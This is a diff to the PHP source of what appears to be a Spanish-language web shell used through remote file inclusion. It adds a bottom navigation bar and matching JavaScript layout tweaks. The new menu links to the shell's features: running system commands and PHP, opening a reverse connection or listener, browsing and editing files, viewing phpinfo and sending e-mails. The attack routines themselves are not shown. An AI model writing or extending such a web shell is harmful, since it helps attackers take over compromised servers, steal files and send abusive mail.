@@ -331,6 +331,7 @@ echo'
                 document.getElementById("flechaderecha").style.display="none";
                 document.getElementById("headoculto").style.right="-16%";
                 document.getElementById("contenedorgrande").style.margin="2% auto 2% auto";
+                document.getElementById("contenedorabajo").style.margin="2% auto 2% auto";
                 document.cookie = "lateral=OFF; path=/";
             }
             function mostrar(){
@@ -338,6 +339,7 @@ echo'
                 document.getElementById("flechaderecha").style.display="";
                 document.getElementById("headoculto").style.right="0";
                 document.getElementById("contenedorgrande").style.margin="2% auto 2% 2%";
+                document.getElementById("contenedorabajo").style.margin="2% auto 2% 2%";
                 document.cookie = "lateral=ON; path=/";
             }
             </script>
@@ -1269,6 +1271,18 @@ psybnc.conf
     
 echo'
     </div>
+    </div>
+    <div class="contenedorgrande" id="contenedorabajo"  style="text-align:center;">
+        <a href="'.$rfiurl.'w=directivas">Directivas</a> 
+        <a href="'.$rfiurl.'w=phpinfo">PHPInfo</a> 
+        <a href="'.$rfiurl.'w=info">Mas informaci&oacute;n</a> 
+        <a href="'.$rfiurl.'w=shell">Ejecutar comandos</a> 
+        <a href="'.$rfiurl.'w=php">Ejecutar PHP</a> 
+        <a href="'.$rfiurl.'w=socketshell">Conexi&oacute;n inversa / escuchar</a> 
+        <a href="'.$rfiurl.'w=archivos">Navegador de archivos</a> 
+        <a href="'.$rfiurl.'w=editar">Editor de archivos</a> 
+        <a href="'.$rfiurl.'w=mail">Enviar E-mails</a> 
+        <a href="'.$rfiurl.'w=creditos">Cr&eacute;ditos</a> 
     </div>
 </body>
 </html>';
